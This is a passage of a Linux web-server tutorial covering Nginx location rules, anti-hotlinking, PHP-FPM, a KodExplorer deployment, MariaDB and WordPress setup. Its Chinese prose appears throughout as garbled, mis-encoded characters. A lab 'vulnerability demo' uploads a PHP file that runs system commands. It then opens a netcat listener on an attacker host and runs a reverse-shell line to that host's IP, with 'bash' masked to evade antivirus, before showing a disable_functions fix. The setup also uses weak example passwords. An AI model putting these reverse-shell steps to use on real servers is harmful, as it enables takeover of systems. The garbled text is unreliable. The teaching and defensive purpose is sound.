å†æ¯”å¦‚ï¼šåªè¦a/Aå¼€å¤´çš„ç›®å½•ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œéƒ½ä¸èƒ½è®¿é—®location ~* /a+/ return 405; # 405æ˜¯ä¸å…è®¸è®¿é—®çš„æ„æ€çš„çŠ¶æ€ç # å†æ¯”å¦‚ï¼šåªè¦aå¼€å¤´çš„ç›®å½•ï¼ŒåŒºåˆ†å¤§å°å†™ï¼Œä¸èƒ½è®¿é—®location ~ /a+/ return 405; # å†æ¯”å¦‚ï¼šä¸èƒ½è®¿é—®1.txtæ–‡ä»¶location = /1.txt return 405; åŒ¹é…ç¬¦å·çš„ä¼˜å…ˆçº§ ## ç¬¦å·ä¼˜å…ˆçº§ = å¤§äº ~ å¤§äº ~* å¤§äº æ— ç¬¦å·touch jpg#é…ç½®æ–‡ä»¶ç¬¦å·ä¼˜å…ˆçº§çš„ä¾‹å­ï¼š location ~ /jpg return 501; location = /jpg return 500; location ~* /Jpg return 503; location /Jpg return 505; 3.17.14 Nginxå¸¸ç”¨å˜é‡ 3.17.15 referé˜²ç›—é“¾refererçš„ä½¿ç”¨åœºæ™¯ ## ç™¾åº¦æœç´¢--ç‚¹å‡»æŸä¸ªç½‘ç«™--æ”¶è´¹## ç›—é“¾ï¼šä½ è‡ªå·±ç½‘ç«™è§†é¢‘ä¸‹è½½åœ°å€ï¼Œè¢«åˆ«äººæ”¾åˆ°ä»–çš„ç½‘ç«™ä¸Šäº†ï¼Œåˆ«äººä»ä»–ç½‘ç«™ä¸Šç‚¹å‡»ä½ çš„ä¸‹è½½é“¾æ¥ï¼Œä¸‹è½½åŠ¨ä½œå’Œæµé‡èµ°çš„æ˜¯ä½ çš„æœåŠ¡å™¨ï¼Œä»–æ”¶è·äº†äººæ°”ï¼Œä½ æŸå¤±äº†æµé‡ã€‚é€šè¿‡refererè¯·æ±‚å¤´å°±å¯ä»¥é˜²ç›—é“¾ã€‚åªè¦ä¸‹è½½è¯·æ±‚æ•°æ®ä¸­çš„refererå€¼ä¸æ˜¯ä½ è‡ªå·±ç½‘ç«™çš„ç½‘å€ï¼Œé‚£å°±ä¸è®©ä¸‹è½½ã€‚ ## é˜²ç›—é“¾è®¾ç½®[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf[root@web01 conf.d]# vim a.jaden.com.conf # åŠ ä¸Šå¦‚ä¸‹å†…å®¹ location ~* \\.png$ if ( $http_referer !~* a.jaden.com ) #!~* ä¸åŒ…å«çš„æ„æ€ return 403; # å¹¶ä¸”å°†locationä¸­çš„ç«™ç‚¹æ ¹ç›®å½•æ”¾åˆ°å…¨å±€æ¥ server listen 80; server_name a.jaden.com; access_log /opt/nginx/a.jaden.com_log jaden; # ç«™ç‚¹æ ¹ç›®å½•è®¾ç½®åˆ°locationå¤–é¢ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„locationçš„ç«™ç‚¹æ ¹ç›®å½•éƒ½æŒ‡å‘/web/one root /web/one; index index.html index.htm; location / #... #root /web/one; #index index.html index.htm; location ~* \\.png$ if ( $http_referer !~* a.jaden.com ) return 403; é‡ç‚¹å˜é‡ï¼š host #httpè¯·æ±‚å¤´çš„hoståŸŸåreferer #ä»å“ªä¸€ä¸ªurlè·³è½¬è¿‡æ¥çš„user_agent #ç”¨æˆ·çš„æµè§ˆå™¨å®¢æˆ·ç«¯ä¿¡æ¯Connection #æ˜¯å¦ä¸ºé•¿é“¾æ¥remote_addr #å®¢æˆ·ç«¯çš„ipstatus #httpçš„çŠ¶æ€ç  3.17.16 ä¸­è‹±æ–‡è‡ªåŠ¨åŒ¹é…è¿™ä¸ªç¤ºä¾‹æˆ‘ä»¬å†åšä¸€ä¸ªåŸŸåï¼Œæ¯”å¦‚yuyan.comã€‚ # mkdir -p /html/lang/en# mkdir -p /html/lang/cn# cd /html/lang/en# vim index.html # å†™ç‚¹è‹±æ–‡# cd /html/lang/cn# vim index.html # å†™ç‚¹æ±‰å­—# hostsæ–‡ä»¶ä¸­åŠ å…¥yuyan.comserver listen 80; server_name yuyan.com; index index.htm index.html; charset utf-8; location / if ( $http_accept_language ~* ^en ) # å¦‚æœaccept_languageçš„å€¼ä»¥enå¼€å¤´ï¼Œä¹Ÿå°±æ˜¯è‹±æ–‡ï¼Œé‚£ä¹ˆè¿”å›è‹±æ–‡çš„ç«™ç‚¹ç›®å½•ï¼Œå¦åˆ™è¿”å›ä¸­æ–‡çš„ç«™ç‚¹ç›®å½•ï¼Œè€Œä¸”æœ‰æ—¶å€™ä¼šæ ¹æ®ipåœ°å€æ¥è¿”å›ä¸åŒè¯­è¨€çš„ç½‘ç«™ã€‚ root /html/lang/en; root /html/lang/cn; 3.17.17 Nginx+phpåšåŠ¨æ€é¡µé¢17-1 å®‰è£…php-fpm#nginxå’Œphpè¦ç»“åˆèµ·æ¥çš„è¯ï¼Œéœ€è¦å®‰è£…php-fpmyum install php-fpm php-mbstring php-mysqlnd php-gd -y #phpè¯­è¨€å¾ˆå¤šåŠŸèƒ½éƒ½ä¾èµ–ä¸€äº›ç‰¹å®šçš„æ’ä»¶ï¼Œä¸€èˆ¬æˆ‘ä»¬å°±å«åšæ¨¡å—ï¼Œè¿™é‡Œæˆ‘ä»¬å®‰è£…ä¸€ä¸‹ï¼Œå…³äºæ¨¡å—ï¼Œè®²è§£phpçš„æ—¶å€™ä¼šç»™å¤§å®¶è®²ã€‚æ’ä»¶çš„æ„æ€å°±æ˜¯ç»™æŸä¸ªä¸œè¥¿å®‰è£…ä¸€ä¸ªæ’ä»¶ï¼Œè¿™ä¸ªä¸œè¥¿å°±å…·å¤‡äº†ä¸€äº›é¢å¤–çš„èƒ½åŠ›ã€‚vim /etc/php-fpm.d/www.conf # éœ€è¦è°ƒæ•´ä¸€äº›é…ç½®#ä¿®æ”¹39è¡Œå’Œ41è¡Œï¼Œç”¨æˆ·å’Œç”¨æˆ·ç»„éƒ½æ”¹ä¸ºnginxï¼Œä¸ç„¶åé¢çš„å„ç§æ“ä½œä¼šæŠ¥é”™ï¼Œæƒé™é—®é¢˜user = nginxgroup = nginx# æ”¹ä¸ºä¹‹åï¼Œæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤systemctl start php-fpm.service systemctl enable php-fpm.service# php-fmpæœåŠ¡å¯åŠ¨ä¹‹åï¼Œä¼šå¼€å¯ä¸€ä¸ª9000ç«¯å£[root@web01 ~]# netstat -lntuptcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN 1611/php-fpm: maste ... 17-2 php-fpmçš„ä½œç”¨æµç¨‹å’ŒNginxé…ç½® è€Œnginxæƒ³è¦è‡ªåŠ¨è½¬å‘ç»™php-fpmï¼Œéœ€è¦ç»™nginxåšä¸€äº›é…ç½®ï¼š # æ¯”å¦‚æˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªwebç«™ç‚¹[root@web01 ~]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf yuyan.com.conf[root@web01 conf.d]# vim wulaoban.com.conf#æ·»åŠ ä¸Šnginxè¿æ¥php-fpmçš„é…ç½®ï¼Œç›´æ¥å¤åˆ¶ä¸‹é¢è¿™ä¸€æ®µå°±è¡Œserver listen 80; server_name wulaoban.com; location / root /html/wulaoban; index index.php index.html index.htm; # å°±æ˜¯ä¸‹é¢è¿™è¿™æ®µé…ç½®ï¼šå¤§å®¶ä¸éœ€è¦ç ”ç©¶æ˜‚ï¼Œå…ˆçŸ¥é“ä¸€ä¸‹å³å¯ location ~ \\.php$ root /html/wulaoban; # è¦å’Œä¸Šé¢çš„ç«™ç‚¹æ ¹ç›®å½•ä¸€è‡´ï¼Œæˆ–è€…æ”¾åˆ°å…¨å±€å»é…ç½® fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /html/wulaoban$fastcgi_script_name; include fastcgi_params; # åˆ›å»ºç«™ç‚¹æ ¹ç›®å½•ï¼š/html/wulaoban[root@web01 conf.d]# mkdir /html/wulaoban# æ£€æŸ¥é…ç½®ï¼š[root@web01 conf.d]# nginx -t# é‡å¯nginx[root@web01 conf.d]# systemctl restart nginx# æˆ‘ä»¬å»ä¸‹è½½ä¸€ä¸ªå¯é“äº‘çš„æºä»£ç æ¥ä½œä¸ºæˆ‘ä»¬çš„ç«™ç‚¹å§ï¼šhttp://kodcloud.com/ï¼Œä¸‹è½½æ–¹å¼çœ‹å›¾ å°†ä»£ç æ”¾åˆ°æˆ‘ä»¬çš„ç«™ç‚¹æ ¹ç›®å½•ä¸­å»è§£å‹ä¸€ä¸‹ï¼š [root@web01 wulaoban]# cd /html/wulaoban/# ä¸Šä¼ è¿‡æ¥[root@web01 wulaoban]# lskodexplorer4.51.zip# è§£å‹[root@web01 wulaoban]# unzip kodexplorer4.51.zip # æŸ¥çœ‹nginxå’Œphp-fpmçš„å¯åŠ¨ç”¨æˆ·ï¼š[root@web01 wulaoban]# ps -ef |grep nginxroot 1697 1488 0 10:15 pts/0 00:00:00 grep --color=auto nginx# å‘ç°éƒ½æ˜¯nginxç”¨æˆ·ï¼Œä½†æ˜¯æˆ‘ä»¬wulaobanç›®å½•ä¸­çš„ä»£ç æ–‡ä»¶éƒ½æ˜¯rootç”¨æˆ·ï¼š[root@web01 wulaoban]# llæ€»ç”¨é‡ 14260drwxr-xr-x 10 root root 115 4æœˆ 11 12:29 app-rw-r--r-- 1 root root 91846 4æœˆ 11 12:28 ChangeLog.mddrwxr-xr-x 3 root root 74 4æœˆ 11 12:29 configdrwxr-xr-x 7 root root 72 4æœˆ 11 12:29 data-rw-r--r-- 1 root root 118 4æœˆ 11 12:28 index.php-rw-r--r-- 1 root root 14494333 4æœˆ 14 10:10 kodexplorer4.51.zipdrwxr-xr-x 15 root root 218 4æœˆ 11 12:29 plugins-rw-r--r-- 1 root root 8074 4æœˆ 11 12:28 README.MDdrwxr-xr-x 6 root root 57 4æœˆ 11 12:29 static# è¿™æ—¶å€™nginxç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™å¯¹è¿™ä¸ªç›®å½•è¿›è¡Œä¸Šä¼ æ–‡ä»¶ç­‰æ“ä½œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åšä¸€ä¸‹æƒé™ä¿®æ”¹ã€‚[root@web01 wulaoban]# chown -R nginx:nginx . # -Rçš„æ„æ€æ˜¯å°†å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ã€æ–‡ä»¶å¤¹åŠå…¶å­ç›®å½•å’Œå­æ–‡ä»¶çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„éƒ½æ”¹ä¸ºnginxã€‚[root@web01 wulaoban]# llæ€»ç”¨é‡ 14260drwxr-xr-x 10 nginx nginx 115 4æœˆ 11 12:29 app-rw-r--r-- 1 nginx nginx 91846 4æœˆ 11 12:28 ChangeLog.mddrwxr-xr-x 3 nginx nginx 74 4æœˆ 11 12:29 configdrwxr-xr-x 7 nginx nginx 72 4æœˆ 11 12:29 data-rw-r--r-- 1 nginx nginx 118 4æœˆ 11 12:28 index.php-rw-r--r-- 1 nginx nginx 14494333 4æœˆ 14 10:10 kodexplorer4.51.zipdrwxr-xr-x 15 nginx nginx 218 4æœˆ 11 12:29 plugins-rw-r--r-- 1 nginx nginx 8074 4æœˆ 11 12:28 README.MDdrwxr-xr-x 6 nginx nginx 57 4æœˆ 11 12:29 static# ç„¶åæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ç½‘ç«™åŸŸåï¼š[root@web01 wulaoban]# cat /etc/nginx/conf.d/wulaoban.com.conf server listen 80; server_name wulaoban.com; # è¿™æ˜¯æˆ‘ä»¬çš„åŸŸå ...# ä¿®æ”¹hostsæ–‡ä»¶ï¼Œæ·»åŠ ä¸€æ¡è®°å½•ï¼š192.168.61.139 wulaoban.com # å…¶ä»–çš„åŸŸåæˆ‘å°±å…ˆåˆ é™¤äº†ï¼Œçœ‹ç€å¤ªä¹±ã€‚# æ¥ä¸‹æ¥å°±å¯ä»¥æ‰“å¼€æµè§ˆå™¨è®¿é—®wulaoban.comåŸŸåäº† 3.17.18 æ¼æ´æ¼”ç¤ºèƒ½å¤Ÿçœ‹åˆ°ç½‘ç«™çš„çœŸå®ç‰©ç†è·¯å¾„ï¼Œé‚£ä¹ˆè¿™ä¸ªäº‹æƒ…å°±ä¸å¤ªå¥½ï¼Œå¯ä»¥è¢«åˆ©ç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶åœ¨æ–‡æ¡£é‚£ä¸ªç›®å½•å§ æ¯”å¦‚æ–‡ä»¶å«åš jaden.php ï¼Œå†…å®¹å¦‚ä¸‹ï¼š ?php system(id) ? #php å¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»ŸæŒ‡ä»¤ åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸Šæ˜¯å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶çš„ç›®å½•çš„ [root@web01 wulaoban]# find /html -type f -name jaden.php/html/wulaoban/data/Group/public/home/æ–‡æ¡£/jaden.php[root@web01 wulaoban]# é‚£ä¹ˆæˆ‘ä»¬åŸºäºæµè§ˆå™¨å°±èƒ½ç›´æ¥è®¿é—®ï¼š wulaoban.com å¯¹åº”çš„å°±æ˜¯ htmlwulaoban è¿™ä¸ªçœŸå®ç‰©ç†è·¯å¾„ï¼š è¿™æ ·å°±çœ‹åˆ°äº†å®ƒçš„ç³»ç»Ÿä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä½ å¯ä»¥ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶å¯¹å®ƒçš„æ“ä½œç³»ç»Ÿè¿›è¡Œå„ç§æ§åˆ¶ã€‚æ¯”å¦‚ç›´æ¥æ‹¿ä¸€ä¸‹å®ƒç³»ç»Ÿçš„æ§åˆ¶ç»ˆç«¯ï¼Œæˆ‘ä»¬ä¸“ä¸šåå­—å«åšåå¼¹shellã€‚ å…ˆåœ¨æ”»å‡»ä¸»æœºä¸Šå®‰è£…ä¸€ä¸ªnvï¼Œå¹¶å¼€å¯ä¸ªncç›‘å¬ # å®‰è£…ncyum install nc -y# å¼€å¯ncç›‘å¬nc -lvnp 9999 ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œï¼šå¯ä»¥å°†ä¸‹é¢çš„æŒ‡ä»¤æ”¾åˆ°åˆšæ‰çš„phpæ–‡ä»¶ä¸­ xxxx -i /dev/tcp/192.168.61.148/9999 01 # è¿™ä¸ªæŒ‡ä»¤å¤§å®¶å…ˆä¸ç”¨ç®¡ä»€ä¹ˆæ„æ€æ˜‚ï¼Œåé¢å†è®²#xxxxè¡¨ç¤ºbashï¼Œä»¥é˜²æˆ‘ä»¬å½“å‰çš„æ–‡æ¡£è¢«æ€è½¯æ€æ‰ï¼Œä¸€äº›æ•æ„Ÿçš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬åˆ†å¼€å†™# æ”»å‡»æœºçš„ipåœ°å€ï¼š192.168.61.148# æ”»å‡»æœºncç›‘å¬çš„ç«¯å£ï¼š9999 è®¿é—®phpæ–‡ä»¶ï¼Œçœ‹åˆ°åå¼¹çš„shelläº†ï¼š å¯ä»¥è®¾ç½®ç¦ç”¨ systemå‡½æ•° ï¼Œå¦‚ä¸‹ vim /etc/php.ini# ä¿®æ”¹314è¡Œï¼š314 disable_functions = system,eval# é‡å¯php-fpm[root@web01 conf.d]# systemctl restart php-fpm.service # ç„¶åå†ç›‘å¬ï¼Œå†è®¿é—®å°±å‘ç°åå¼¹ä¸äº†äº†ã€‚ 3.18 sessionå’Œcookisession å­˜å‚¨åœ¨æœåŠ¡å™¨ [root@web01 conf.d]# cd /html/wulaoban/data/session/[root@web01 session]# lsindex.html sess_5hqvbhq6fqvbmtson44nvqmhe4 sess_e4s9ftmsahhp7v9n7cci8g81j4sess_3o9n4e45an60e77r1kl2s6gph7 sess_6v3je2a0ntfqoj7u19k365i103 sess_eebukpnijqghv3uami4cn9nup6#åªè¦ç”¨æˆ·ç™»å½•æˆåŠŸä¹‹åï¼ŒæœåŠ¡å°±ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªsessionï¼Œå…¶å®è¿™ä¸ªç½‘ç«™æ˜¯è®¿é—®ä¸€ä¸‹ï¼Œä¸ç®¡æœ‰æ²¡æœ‰ç™»å½•æˆåŠŸéƒ½ä¼šç”Ÿæˆsessionæ•°æ®#æˆ‘ä»¬å¯ä»¥åœ¨å®¢æˆ·ç«¯å·²ç»ç™»å½•äº†çš„æƒ…å†µä¸‹ï¼ŒæŠŠsessionå…¨éƒ¨åˆ æ‰ï¼Œçœ‹ä¸€ä¸‹å®¢æˆ·ç«¯æ˜¯å¦è¿˜æ˜¯ç™»å½•çŠ¶æ€[root@web01 session]# rm -rf sess_*[root@web01 session]# lsindex.html# ç™»å½•ä¸€ä¸‹çœ‹æ•ˆæœï¼š[root@web01 session]# llæ€»ç”¨é‡ 4-rwxrwxrwx 1 nginx nginx 0 4æœˆ 11 12:29 index.html-rwxrwxrwx 1 nginx nginx 395 4æœˆ 14 15:08 sess_3o9n4e45an60e77r1kl2s6gph7[root@web01 session]# cat sess_3o9n4e45an60e77r1kl2s6gph7 3.19 ç½‘ç«™æ¶æ„ç½‘ç«™æ¶æ„æŒ‡çš„æ˜¯ä¸€ä¸ªç½‘ç«™çš„æ­å»ºç¯å¢ƒï¼šæ“ä½œç³»ç»Ÿ+è½¯ä»¶+å¼€å‘è¯­è¨€è¿™ä¹ˆä¸‰ä¸ªéƒ¨åˆ†ç»„æˆã€‚è€Œä¸”å¾ˆå¤šæƒ…å†µä¸‹ä»–ä»¬æ˜¯å¸¸ç”¨çš„ç›¸å¯¹æ¯”è¾ƒå›ºå®šçš„ç»„åˆã€‚è½¯ä»¶ä¸»è¦æŒ‡çš„æ˜¯ä¸­é—´ä»¶(ä¸»è¦æŒ‡çš„æ˜¯webæœåŠ¡åº”ç”¨ç¨‹åº)+æ•°æ®åº“ã€‚ æ•°æ®åº“ï¼šmysql\\oracleâ€¦æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œä¹Ÿå«åšæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ŒDBMSï¼šdatabase manager system linux + nginx + mysql + php ## lnmpæ¶æ„linux + apache + mysql + php ## lampæ¶æ„windows + apache + mysql + php ## wampæ¶æ„linux + nginx + mysql + tomcat ## lnmtæ¶æ„ ï¼Œä¸»è¦æ˜¯è·‘javaè¯­è¨€é¡¹ç›®çš„ï¼Œtomcatæœ¬èº«ä¹Ÿæ˜¯webæœåŠ¡ç¨‹åºï¼Œä½†æ˜¯æœ¬èº«æ•ˆç‡ä½ï¼Œå¯ä»¥å’Œnginxç»“åˆä¸€èµ·ä½¿ç”¨linux + nginx + mysql + uwsgi ## lnmuæ¶æ„ï¼Œä¸»è¦æ˜¯è·‘pythonè¯­è¨€é¡¹ç›®çš„æˆ‘ä»¬å…ˆæ‹æ¸…æ¥šlnmpæ¶æ„ï¼Œå…¶ä»–çš„ä¹Ÿå°±éƒ½ç®€å•äº†ã€‚ 3.20 mysql#mysqlä»¥å‰æ˜¯ä¸€æ¬¾å¼€æºçš„è½¯ä»¶ï¼Œæ”¶è´¹çš„å•†ä¸šç‰ˆæ•°æ®åº“æ˜¯oracleï¼Œä¹‹å‰äº’è”ç½‘å‘èµ·äº†å»ioeé¡¹ç›®ï¼Œoå°±æ˜¯oracleï¼Œå¾ˆè´µã€‚iæ˜¯IBMç¡¬ä»¶ã€Eæ˜¯EMCå­˜å‚¨è®¾å¤‡éƒ½å¾ˆè´µï¼Œæ‰€ä»¥å¥½å¤šå…¬å¸å‘èµ·äº†è¿™ä¸ªè¡ŒåŠ¨ï¼Œè¿™ä¹Ÿæ˜¯å¤§å®¶å€¾å‘äºå¼€æºè½¯ä»¶çš„ä¸€ä¸ªåŸå› ã€‚åæ¥mysqlå‘å±•å¾ˆå¥½ï¼Œå¸‚åœºå æœ‰é‡ä¹Ÿå˜çš„æ¯”è¾ƒå¤§äº†ï¼Œå›½å†…ç”¨çš„ç‰¹åˆ«å¤šï¼Œoracleä¸€çœ‹ä¸è¡Œï¼Œ10ä¸ªäº¿ç¾å…ƒæ”¶è´­äº†mysqlï¼Œä½†æ˜¯mysqlçš„åˆ›å§‹äººæ²¡é—²ç€ï¼ŒæŒ‰ç…§mysqlçš„æ ‡å‡†åˆåˆ›å»ºäº†ä¸€ä¸ªæ•°æ®åº“è½¯ä»¶ï¼Œmariadbï¼Œå’Œmysqlçš„ç”¨æ³•æ˜¯åŸºæœ¬ä¸€æ ·çš„ï¼Œæ‰€æœ‰çš„æ“ä½œæŒ‡ä»¤éƒ½æ˜¯ä¹‹å‰mysqlçš„ã€‚mariaæ˜¯åˆ›å§‹äººçš„å­™å¥³ã€‚ å®‰è£…æ•°æ®åº“ å®‰è£…æ•°æ®åº“yum install mariadb-server mariadb -ysystemctl start mariadbsystemctl enable mariadb# mariadbå¯åŠ¨ä¹‹åä¼šè‡ªåŠ¨ç›‘å¬3306ç«¯å£[root@web01 ~]# netstat -lntuptcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 1830/mysqld ... #å¯ä»¥çœ‹åˆ°æœåŠ¡è¿˜æ˜¯å«åšmysqld æ•°æ®åº“æ“ä½œ #ç™»å½•æ•°æ®åº“mysql #è¾“å…¥mysqlç„¶åå›è½¦ï¼Œå°±èƒ½åœ¨æœ¬æœºç›´æ¥ç™»å½•æ•°æ®äº†[root@web01 ~]# mysql Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2 Server version: 5.5.68-MariaDB MariaDB Server Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type help; or \\h for help. Type \\c to clear the current input statement. MariaDB [(none)] exit # exitæ˜¯é€€å‡º# å¦‚æœæˆ‘ä»¬å…³é—­äº†mariadbæœåŠ¡çš„è¯ï¼Œåœ¨è¾“å…¥mysqlå°±ä¼šæŠ¥é”™[root@web01 ~]# systemctl stop mariadb.service [root@web01 ~]# mysqlERROR 2002 (HY000): Cant connect to local MySQL server through socket /var/lib/mysql/mysql.sock (2)#mysqlç™»å½•è¿›å»å°±å¯ä»¥è¿›è¡Œæ•°æ®åº“æ“ä½œäº†#æ•°æ®åº“ä¸­æœ‰ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ#åº“ï¼šå­˜æ•°æ®è¡¨çš„ä»“åº“ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªç½‘ç«™ä¸€ä¸ªä»“åº“ï¼Œä»–å®é™…ä¸Šå¯¹åº”ç€ç¡¬ç›˜ä¸Šçš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯ä¸ªåº“éƒ½æœ‰è‡ªå·±çš„åå­—#è¡¨ï¼šå’Œexcelè¡¨ä¸€æ ·çš„è¡¨ç°å½¢å¼æ¥å­˜å‚¨æ•°æ®ï¼ŒäºŒç»´è¡¨ï¼Œä»–å¯¹åº”ç€æ–‡ä»¶å¤¹ä¸­çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶å®ä¸€ä¸ªè¡¨éœ€è¦å¤šä¸ªæ–‡ä»¶æ¥å­˜å‚¨æ•°æ®ï¼Œæ¯ä¸ªè¡¨éƒ½æœ‰è‡ªå·±çš„åå­—#è®°å½•ï¼šè¡¨çš„ç¬¬ä¸€è¡Œå«åšè¡¨å¤´ï¼Œä¹Ÿå«åšåˆ—åï¼Œå‰©ä¸‹çš„è¡Œéƒ½æ˜¯å®é™…çš„æ•°æ®ã€‚ä¸€è¡Œè®°å½•æ˜¯ä¸€æ¡æ•°æ®ï¼Œå¤šæ•°éƒ½ä¼šåŒ…å«ä¸€ä¸ªå¯¹è±¡çš„å…¨éƒ¨æè¿°ä¿¡æ¯#ä¸¾ä¾‹ï¼šæ¯”å¦‚ä¸‹é¢è¿™ä¸ªè¡¨ï¼Œæ°´æœè¡¨,fruitï¼šid name price number1 è‹¹æœ 11.00 202 é¦™è•‰ 15.05 183 æ©˜å­ 8.06 30 è®¾ç½®æ•°æ®åº“å¯†ç  mysql use mysql;mysql UPDATE user SET password=password(test123) WHERE user=root;mysql flush privileges ç®€ç­”çš„æ•°æ®åº“æ“ä½œ sqlè¯­å¥ï¼šç»“æ„åŒ–æŸ¥è¯¢è¯­å¥ï¼Œæ•°æ®åº“çš„æ“ä½œæŒ‡ä»¤#åˆ›å»ºæ•°æ®åº“create database wordpress;#åˆ é™¤æ•°æ®åº“ï¼Œå·¥ä½œä¸­åƒä¸‡ä¸è¦åˆ é™¤å…¬å¸çš„æ•°æ®åº“ã€‚drop database wordpress;#åˆ‡æ¢æ•°æ®åº“use mysql#æŸ¥çœ‹è¡¨show tables;#åˆ é™¤è¡¨drop table xxxxx;#æŸ¥çœ‹æ‰€æœ‰æ•°æ®select user,host,Password from user;#æˆæƒï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªç”¨æˆ·ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºï¼Œå…¶å®åˆ›å»ºç”¨æˆ·è¿˜æœ‰å‡ ç§å…¶ä»–çš„æ–¹å¼#ç»™æ™®é€šç”¨æˆ·æˆè¿œç¨‹è¿æ¥çš„æƒé™ï¼šgrant all on wordpress.* to wordpress@192.168.61.% identified by 123456;#ç»™æ™®é€šç”¨æˆ·æˆæœ¬åœ°ç™»å½•çš„æƒé™ï¼šé»˜è®¤ä¸»æœºåä¸ºlocalhostï¼Œæˆ‘ä¹‹å‰æ”¹äº†ä¸»æœºåå«åšweb01#grant all on wordpress.* to wordpress@ä¸»æœºå identified by 123456;grant all on wordpress.* to wordpress@web01 identified by 123456;grant all on wordpress.* to wordpress@localhost identified by 123456;#ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•mysql -u wordpress -p123456 -h 192.168.61.139#å®‰å…¨åˆå§‹åŒ–mysqlï¼Œè¿™ä¸ªå…ˆä¸æ‰§è¡Œäº†ã€‚mysql_secure_installation## å›è½¦ï¼Œn,ä¸€è·¯y 3.21 wordpresswordpressæ˜¯ä¸€ä¸ªåšå®¢ç½‘ç«™ï¼Œæˆ‘ä»¬æ¥æ­å»ºä¸€ä¸‹ï¼Œä¹Ÿæ˜¯phpå¼€å‘çš„ï¼Œä½¿ç”¨çš„æ˜¯mysqlæ•°æ®åº“ã€‚ å‰é¢mysqlä¸­æˆ‘ä»¬å·²ç»åˆ›å»ºäº†ä¸€ä¸ªå«åšwordpressçš„æ•°æ®åº“ï¼Œè€Œä¸”ç”¨æˆ·ä¹Ÿæˆæƒå¥½äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ­å»ºä¸€ä¸ªwordpressç«™ç‚¹ã€‚ 3.21.1 å¢åŠ nginxçš„ç«™ç‚¹é…ç½®æ–‡ä»¶[root@web01 ~]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf wulanban.com.conf www.wulaoban.top.conf yuyan.com.conf#å› ä¸ºwordpressä¹Ÿæ˜¯phpå¼€å‘çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å¤åˆ¶ä¸€ä»½wulanban.com.confæ”¹ä¸€æ”¹å°±è¡Œ[root@web01 conf.d]# cp wulanban.com.conf wp.jaden.com.conf[root@web01 conf.d]# vim wp.jaden.com.confserver listen 80; server_name wp.jaden.com; # æ³¨æ„ä¸è¦å†™wordpress.comï¼Œè¿™ä¸ªå’Œå®˜ç½‘åœ°å€å†²çªï¼Œæ”¹hostsæ–‡ä»¶å¯èƒ½éƒ½ä¸è¡Œ location / root /html/wp; index index.php index.html index.htm; # å°±æ˜¯ä¸‹é¢è¿™è¿™æ®µé…ç½®ï¼šå¤§å®¶ä¸éœ€è¦ç ”ç©¶æ˜‚ï¼Œå…ˆçŸ¥é“ä¸€ä¸‹å³å¯ location ~ \\.php$ root /html/wp; # è¦å’Œä¸Šé¢çš„ç«™ç‚¹æ ¹ç›®å½•ä¸€è‡´ï¼Œæˆ–è€…æ”¾åˆ°å…¨å±€å»é…ç½® fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /html/wp$fastcgi_script_name; include fastcgi_params; # ä¿å­˜ä¹‹åï¼Œæ£€æŸ¥è¯­æ³•nginx -t# é‡å¯nginxsystemctl restart nginx.service# åˆ›å»ºç«™ç‚¹æ ¹ç›®å½•mkdir /html/wp 3.21.2 ä¸Šä¼ wordpressæºä»£ç wordpressæºä»£ç æˆ‘ç»™å¤§å®¶å‡†å¤‡å¥½äº†ï¼Œæˆ‘è¿™é‡Œæœ‰å‡ ä¸ªç‰ˆæœ¬ï¼Œå®‰è£…å¦‚ä¸‹è¿™ä¸ªç‰ˆæœ¬å³å¯ï¼Œå‰©ä¸‹çš„å…ˆç•™ç€ [root@web01 ~]# cd /html/wp/[root@web01 wp]# rz -Erz waiting to receive.[root@web01 wp]# lsWordPress-4.6.tar.gz[root@web01 wp]# tar xf WordPress-4.6.tar.gz [root@web01 wp]# lsWordPress-4.6 WordPress-4.6.tar.gz[root@web01 wp]# mv WordPress-4.6/* . # å°†æ‰€æœ‰ä»£ç æ”¾åˆ°æ ¹ç›®å½•ä¸‹[root@web01 wp]# llæ€»ç”¨é‡ 9764-rw-rw-r-- 1 root root 418 8æœˆ 17 2016 index.php-rw-rw-r-- 1 root root 19935 8æœˆ 17 2016 license.txt-rw-rw-r-- 1 root root 7342 8æœˆ 17 